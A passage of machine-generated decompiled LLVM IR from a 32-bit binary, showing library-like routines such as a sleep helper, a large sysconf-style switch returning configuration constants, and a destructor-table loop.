dec_label_pc_8053e74:                             ; preds = %dec_label_pc_8053e3a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053e7a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053e7a = call i32 @function_80523fd(i32 2, %_TYPEDEF_sigset_t* %v3_8053e7a, i32 0)
  store i32 %v4_8053e7a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053e90

dec_label_pc_8053e85:                             ; preds = %dec_label_pc_8053db7
  %v2_8053e87 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053e87, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e90

dec_label_pc_8053e90:                             ; preds = %dec_label_pc_8053e74, %dec_label_pc_8053e85
  %storemerge3.pre-phi = phi i32 [ %v2_8053e46, %dec_label_pc_8053e74 ], [ %v2_8053e87, %dec_label_pc_8053e85 ]
  %v3_8053e90 = phi i32 [ %v2_8053d9c, %dec_label_pc_8053e74 ], [ %v4_8053dbc, %dec_label_pc_8053e85 ]
  %v2_8053e90 = phi i32 [ 0, %dec_label_pc_8053e74 ], [ %v4_8053dbc, %dec_label_pc_8053e85 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053e90 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053e90 = call i32 @function_80547e7(%timespec* %v4_8053e90, i32 %storemerge3.pre-phi, i32 %v2_8053e90, i32 %v3_8053e90)
  store i32 %v5_8053e90, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e97

dec_label_pc_8053e97:                             ; preds = %dec_label_pc_8053e4f, %dec_label_pc_8053e90
  %v0_8053e9a = phi i32 [ %v0_8053e9a.pre, %dec_label_pc_8053e4f ], [ %v5_8053e90, %dec_label_pc_8053e90 ]
  %v1_8053e9a = icmp eq i32 %v0_8053e9a, 0
  br i1 %v1_8053e9a, label %dec_label_pc_8053eb7, label %dec_label_pc_8053e9e

dec_label_pc_8053e9e:                             ; preds = %dec_label_pc_8053e97
  %v4_8053eae = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053eae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ebe

dec_label_pc_8053eb7:                             ; preds = %dec_label_pc_8053d40, %dec_label_pc_8053e97
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ebe

dec_label_pc_8053ebb:                             ; preds = %dec_label_pc_8053de0, %dec_label_pc_8053d9b, %dec_label_pc_8053d6d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ebe

dec_label_pc_8053ebe:                             ; preds = %dec_label_pc_8053eb7, %dec_label_pc_8053e9e, %dec_label_pc_8053e12, %dec_label_pc_8053ebb
  %v0_8053ec8 = phi i32 [ 0, %dec_label_pc_8053eb7 ], [ %v4_8053eae, %dec_label_pc_8053e9e ], [ %v0_8053ec8.pre, %dec_label_pc_8053e12 ], [ -1, %dec_label_pc_8053ebb ]
  store i32 %v0_8053d43, i32* @ebx, align 4
  store i32 %v0_8053d42, i32* @esi, align 4
  store i32 %v0_8053d41, i32* @edi, align 4
  store i32 %v0_8053d40, i32* @ebp, align 4
  ret i32 %v0_8053ec8

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8053e5a, { 1, 0, 2 }
  uselistorder i32 %v2_8053e46, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053ddd, { 2, 1, 0 }
  uselistorder i32 %v4_8053dbc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8053d9c, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8053d83, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053d6a, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 0, 1, 23 }
  uselistorder i32 (i32, i32*, i32)* @function_805428f, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8052ade, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053ebe, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053eb7, { 1, 0 }
  uselistorder label %dec_label_pc_8053e97, { 1, 0 }
  uselistorder label %dec_label_pc_8053e90, { 1, 0 }
  uselistorder label %dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge, { 1, 0 }
}

define i32 @function_8053ec9(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053ec9:
  switch i32 %arg1, label %dec_label_pc_8053ee8 [
    i32 0, label %dec_label_pc_8053ef8
    i32 1, label %dec_label_pc_8053fdd
    i32 2, label %dec_label_pc_8053f02
    i32 3, label %dec_label_pc_8053f0c
    i32 4, label %dec_label_pc_8053f16
    i32 5, label %dec_label_pc_8053fac
    i32 6, label %dec_label_pc_8053f1e
    i32 7, label %dec_label_pc_8053ede
    i32 8, label %dec_label_pc_8053ede
    i32 9, label %dec_label_pc_8053ede
    i32 10, label %dec_label_pc_8053ede
    i32 11, label %dec_label_pc_8053ede
    i32 12, label %dec_label_pc_8053ede
    i32 13, label %dec_label_pc_8053ede
    i32 14, label %dec_label_pc_8053ede
    i32 15, label %dec_label_pc_8053ede
    i32 16, label %dec_label_pc_8053ede
    i32 17, label %dec_label_pc_8053ede
    i32 18, label %dec_label_pc_8053ede
    i32 19, label %dec_label_pc_8053ede
    i32 20, label %dec_label_pc_8053ede
    i32 21, label %dec_label_pc_8053ede
    i32 22, label %dec_label_pc_8053ede
    i32 23, label %dec_label_pc_8053fdd
    i32 24, label %dec_label_pc_8053fdd
    i32 25, label %dec_label_pc_8053fe9
    i32 26, label %dec_label_pc_8053fba
    i32 27, label %dec_label_pc_8053fdd
    i32 28, label %dec_label_pc_8053f30
    i32 29, label %dec_label_pc_8053fb3
    i32 30, label %dec_label_pc_8053f28
    i32 31, label %dec_label_pc_8053fc8
    i32 32, label %dec_label_pc_8053fdd
    i32 33, label %dec_label_pc_8053fdd
    i32 34, label %dec_label_pc_8053fdd
    i32 35, label %dec_label_pc_8053fc1
    i32 36, label %dec_label_pc_8053ff0
    i32 37, label %dec_label_pc_8053ff7
    i32 38, label %dec_label_pc_8053ff0
    i32 39, label %dec_label_pc_8053f3a
    i32 40, label %dec_label_pc_8053ffe
    i32 41, label %dec_label_pc_8053fdd
    i32 42, label %dec_label_pc_8053fc8
    i32 43, label %dec_label_pc_8053ff7
    i32 44, label %dec_label_pc_8054005
    i32 45, label %dec_label_pc_8053ff7
    i32 46, label %dec_label_pc_8053fb3
    i32 47, label %dec_label_pc_8053fb3
    i32 48, label %dec_label_pc_8053fb3
    i32 49, label %dec_label_pc_8053fdd
    i32 50, label %dec_label_pc_8053fdd
    i32 51, label %dec_label_pc_8053fb3
    i32 52, label %dec_label_pc_8053fb3
    i32 53, label %dec_label_pc_8053fdd
    i32 54, label %dec_label_pc_8053fdd
    i32 55, label %dec_label_pc_8053fdd
    i32 56, label %dec_label_pc_8053fdd
    i32 57, label %dec_label_pc_8053fdd
    i32 58, label %dec_label_pc_8053fdd
    i32 59, label %dec_label_pc_8053fdd
    i32 60, label %dec_label_pc_8053fdd
    i32 61, label %dec_label_pc_8053fdd
    i32 62, label %dec_label_pc_8053fdd
    i32 63, label %dec_label_pc_8053fdd
    i32 64, label %dec_label_pc_8053fdd
    i32 65, label %dec_label_pc_8053fdd
    i32 66, label %dec_label_pc_8053fdd
    i32 67, label %dec_label_pc_8053ede
    i32 68, label %dec_label_pc_8053ede
    i32 69, label %dec_label_pc_8053fc1
    i32 70, label %dec_label_pc_8053fc1
    i32 71, label %dec_label_pc_8053fc1
    i32 72, label %dec_label_pc_8053fc8
    i32 73, label %dec_label_pc_8053fcf
    i32 74, label %dec_label_pc_8053fd6
    i32 75, label %dec_label_pc_8053f44
    i32 76, label %dec_label_pc_8053fd6
    i32 77, label %dec_label_pc_8053ede
    i32 78, label %dec_label_pc_8053ede
    i32 79, label %dec_label_pc_8053ede
    i32 80, label %dec_label_pc_8053ede
    i32 81, label %dec_label_pc_8053ede
    i32 82, label %dec_label_pc_8053ede
    i32 83, label %dec_label_pc_8053ede
    i32 84, label %dec_label_pc_8053ede
    i32 85, label %dec_label_pc_8053fdd
    i32 86, label %dec_label_pc_8053fdd
    i32 87, label %dec_label_pc_8053fba
    i32 88, label %dec_label_pc_8053f4e
    i32 89, label %dec_label_pc_8053f58
    i32 90, label %dec_label_pc_8053fcf
    i32 91, label %dec_label_pc_8053ede
    i32 92, label %dec_label_pc_8053ede
    i32 93, label %dec_label_pc_8053ede
    i32 94, label %dec_label_pc_8053ede
    i32 95, label %dec_label_pc_8053fb3
    i32 96, label %dec_label_pc_8053fdd
    i32 97, label %dec_label_pc_8053fdd
    i32 98, label %dec_label_pc_8053ede
    i32 99, label %dec_label_pc_8053ede
    i32 100, label %dec_label_pc_8053ede
    i32 101, label %dec_label_pc_8053f62
    i32 102, label %dec_label_pc_8053fa5
    i32 103, label %dec_label_pc_8053fe2
    i32 104, label %dec_label_pc_8053fba
    i32 105, label %dec_label_pc_8053f6c
    i32 106, label %dec_label_pc_8053fc8
    i32 107, label %dec_label_pc_8053fc8
    i32 108, label %dec_label_pc_8053fac
    i32 109, label %dec_label_pc_8053fe9
    i32 110, label %dec_label_pc_8054005
    i32 111, label %dec_label_pc_8053fa5
    i32 112, label %dec_label_pc_8053fe2
    i32 113, label %dec_label_pc_8054005
    i32 114, label %dec_label_pc_8053f76
    i32 115, label %dec_label_pc_8053ffe
    i32 116, label %dec_label_pc_8053fdd
    i32 117, label %dec_label_pc_8053fdd
    i32 118, label %dec_label_pc_8053f80
    i32 119, label %dec_label_pc_8053f8a
    i32 120, label %dec_label_pc_8053ff7
    i32 121, label %dec_label_pc_8053fba
    i32 122, label %dec_label_pc_8053fba
    i32 123, label %dec_label_pc_8053fba
    i32 124, label %dec_label_pc_8053fba
    i32 125, label %dec_label_pc_8053ede
    i32 126, label %dec_label_pc_8053ede
    i32 127, label %dec_label_pc_8053fdd
    i32 128, label %dec_label_pc_8053fdd
    i32 129, label %dec_label_pc_8053ede
    i32 130, label %dec_label_pc_8053ede
    i32 131, label %dec_label_pc_8053fdd
    i32 149, label %dec_label_pc_8053f91
  ]

dec_label_pc_8053ede:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053ee8:                             ; preds = %dec_label_pc_8053ec9
  %v1_8053ee8 = call i32 @function_80526c9(i32 ptrtoint (i32* @0 to i32))
  %v1_8053eed = inttoptr i32 %v1_8053ee8 to i32*
  store i32 22, i32* %v1_8053eed, align 4
  br label %dec_label_pc_8053fdd

dec_label_pc_8053ef8:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f02:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f0c:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f16:                             ; preds = %dec_label_pc_8053ec9
  %v0_8053f19 = call i32 @function_8054615()
  br label %dec_label_pc_8053f1e

dec_label_pc_8053f1e:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053f16
  br label %dec_label_pc_805400a

dec_label_pc_8053f28:                             ; preds = %dec_label_pc_8053ec9
  %v0_8053f2b = call i32 @function_80546ac()
  br label %dec_label_pc_8053f30

dec_label_pc_8053f30:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053f28
  br label %dec_label_pc_805400a

dec_label_pc_8053f3a:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f44:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f4e:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f58:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f62:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f6c:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f76:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f80:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f8a:                             ; preds = %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053f91:                             ; preds = %dec_label_pc_8053ec9
  %v5_8053f97 = call i32 @function_8054418(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8053f9f = icmp slt i32 %v5_8053f97, 0
  %v1_8053fa1 = icmp eq i1 %v2_8053f9f, false
  br i1 %v1_8053fa1, label %dec_label_pc_8053fb3, label %dec_label_pc_8053fdd

dec_label_pc_8053fa5:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fac:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fb3:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053f91
  br label %dec_label_pc_805400a

dec_label_pc_8053fba:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fc1:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fc8:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fcf:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fd6:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fdd:                             ; preds = %dec_label_pc_8053f91, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ee8
  br label %dec_label_pc_805400a

dec_label_pc_8053fe2:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053fe9:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053ff0:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053ff7:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8053ffe:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_8054005:                             ; preds = %dec_label_pc_8053ec9, %dec_label_pc_8053ec9, %dec_label_pc_8053ec9
  br label %dec_label_pc_805400a

dec_label_pc_805400a:                             ; preds = %dec_label_pc_8053ffe, %dec_label_pc_8053ff7, %dec_label_pc_8053ff0, %dec_label_pc_8053fe9, %dec_label_pc_8053fe2, %dec_label_pc_8053fd6, %dec_label_pc_8053fcf, %dec_label_pc_8053fc8, %dec_label_pc_8053fc1, %dec_label_pc_8053fba, %dec_label_pc_8053fac, %dec_label_pc_8053fa5, %dec_label_pc_8053fb3, %dec_label_pc_8053f8a, %dec_label_pc_8053f80, %dec_label_pc_8053f76, %dec_label_pc_8053f6c, %dec_label_pc_8053f62, %dec_label_pc_8053f58, %dec_label_pc_8053f4e, %dec_label_pc_8053f44, %dec_label_pc_8053f3a, %dec_label_pc_8053f30, %dec_label_pc_8053f1e, %dec_label_pc_8053f0c, %dec_label_pc_8053f02, %dec_label_pc_8053ef8, %dec_label_pc_8053ede, %dec_label_pc_8053fdd, %dec_label_pc_8054005
  %v0_805400d = phi i32 [ 255, %dec_label_pc_8053ffe ], [ 2048, %dec_label_pc_8053ff7 ], [ 99, %dec_label_pc_8053ff0 ], [ 20, %dec_label_pc_8053fe9 ], [ -128, %dec_label_pc_8053fe2 ], [ 1024, %dec_label_pc_8053fd6 ], [ 4, %dec_label_pc_8053fcf ], [ 32, %dec_label_pc_8053fc8 ], [ 256, %dec_label_pc_8053fc1 ], [ 2147483647, %dec_label_pc_8053fba ], [ 16, %dec_label_pc_8053fac ], [ 127, %dec_label_pc_8053fa5 ], [ 200112, %dec_label_pc_8053fb3 ], [ 9, %dec_label_pc_8053f8a ], [ 65535, %dec_label_pc_8053f80 ], [ -32768, %dec_label_pc_8053f76 ], [ -2147483648, %dec_label_pc_8053f6c ], [ 8, %dec_label_pc_8053f62 ], [ 500, %dec_label_pc_8053f58 ], [ 4096, %dec_label_pc_8053f4e ], [ 16384, %dec_label_pc_8053f44 ], [ 1000, %dec_label_pc_8053f3a ], [ 32768, %dec_label_pc_8053f30 ], [ 6, %dec_label_pc_8053f1e ], [ 65536, %dec_label_pc_8053f0c ], [ 100, %dec_label_pc_8053f02 ], [ 131072, %dec_label_pc_8053ef8 ], [ 1, %dec_label_pc_8053ede ], [ -1, %dec_label_pc_8053fdd ], [ 32767, %dec_label_pc_8054005 ]
  ret i32 %v0_805400d

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 23, 24, 14, 15, 1, 2, 12, 13, 16, 17, 18, 19, 3, 4, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 3, 0, 1, 2, 4 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 5, 1, 6, 2, 0, 3, 4 }
  uselistorder i32 255, { 1, 2, 3, 5, 6, 7, 8, 4, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 3, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 3, 0, 1, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 26, { 4, 1, 2, 0, 3, 5, 6, 7 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 13, 1, 18, 19, 7, 6, 8, 5, 15, 16, 14, 4, 2, 3, 17, 0, 9, 10, 12, 11 }
  uselistorder label %dec_label_pc_805400a, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8053fdd, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8053fb3, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053f30, { 1, 0 }
  uselistorder label %dec_label_pc_8053f1e, { 1, 0 }
}

define i32 @function_805400e() local_unnamed_addr {
dec_label_pc_805400e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805400e = load i32, i32* @ebx, align 4
  store i32 %v0_805400e, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32 0), label %dec_label_pc_8054022, label %dec_label_pc_805402f

dec_label_pc_8054022:                             ; preds = %dec_label_pc_805400e, %dec_label_pc_8054022
  %v1_80540296 = phi i32 [ %v1_8054029, %dec_label_pc_8054022 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567a4.233 to i32), i32 -134571940), i32 2), i32 -1), %dec_label_pc_805400e ]
  store i32 ptrtoint (i32* @global_var_8054029.234 to i32), i32* %stack_var_-16, align 4
  %v5_8054022 = mul i32 %v1_80540296, 4
  %v6_8054022 = add i32 %v5_8054022, ptrtoint (i32* @global_var_80567a4.233 to i32)
  %v7_8054022 = inttoptr i32 %v6_8054022 to i32*
  %v8_8054022 = load i32, i32* %v7_8054022, align 4
  call void @__pseudo_call(i32 %v8_8054022)
  %v0_8054029.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054029 = add i32 %v0_8054029.pre, -1
  store i32 %v1_8054029, i32* %ebx.global-to-local, align 4
  %v10_805402a = icmp eq i32 %v0_8054029.pre, 0
  %v1_805402d = icmp eq i1 %v10_805402a, false
  br i1 %v1_805402d, label %dec_label_pc_8054022, label %dec_label_pc_805402f

dec_label_pc_805402f:                             ; preds = %dec_label_pc_8054022, %dec_label_pc_805400e
  %v0_805402f = load i32, i32* @global_var_8056908.235, align 8
  %v1_8054034 = icmp eq i32 %v0_805402f, 0
  br i1 %v1_8054034, label %dec_label_pc_805403a, label %dec_label_pc_8054038

dec_label_pc_8054038:                             ; preds = %dec_label_pc_805402f
  %v0_8054038 = load i32, i32* %stack_var_-16, align 4
  %v1_8054038 = call i32 @unknown_0(i32 %v0_8054038)
  br label %dec_label_pc_805403a

dec_label_pc_805403a:                             ; preds = %dec_label_pc_8054038, %dec_label_pc_805402f
  %v0_805403a = load i32, i32* @global_var_805690c.236, align 4
  store i32 %v0_805403a, i32* @ecx, align 4
  %v1_8054040 = icmp eq i32 %v0_805403a, 0
  br i1 %v1_8054040, label %dec_label_pc_8054049, label %dec_label_pc_8054044

dec_label_pc_8054044:                             ; preds = %dec_label_pc_805403a
  %v2_8054046 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054046, i32* %ebx.global-to-local, align 4
  %v0_8054047 = load i32, i32* %stack_var_-16, align 4
  %v1_8054047 = call i32 @unknown_0(i32 %v0_8054047)
  br label %dec_label_pc_8054049

dec_label_pc_8054049:                             ; preds = %dec_label_pc_805403a, %dec_label_pc_8054044
  %v2_8054049 = load i32, i32* %stack_var_-16, align 4
  %v2_805404a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805404a, i32* @edx, align 4
  ret i32 %v2_8054049

; uselistorder directives
  uselistorder i32 %v1_8054029, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054049, { 1, 0 }
  uselistorder label %dec_label_pc_8054022, { 1, 0 }
}

define i32 @function_805404d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805404d:
  ret i32 0
}

define i32 @function_8054050(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054050:
  %v0_8054050 = load i32, i32* @eax, align 4
  ret i32 %v0_8054050
}

define i32 @function_8054051() local_unnamed_addr {
dec_label_pc_8054051:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8054051 = load i32, i32* @esi, align 4
  %v0_8054052 = load i32, i32* @ebx, align 4
  %v0_8054056 = load i32, i32* @eax, align 4
  store i32 %v0_8054056, i32* @esi, align 4
  %v0_8054058 = load i32, i32* @edx, align 4
  store i32 %v0_8054058, i32* @ebx, align 4
  %v4_805405d = call i32 @function_80520cd(i32 %v0_8054056, i32 1, i32 %tmp6)
  %v8_8054065 = icmp eq i32 %v4_805405d, -1
  %v1_8054066 = icmp eq i1 %v8_8054065, false
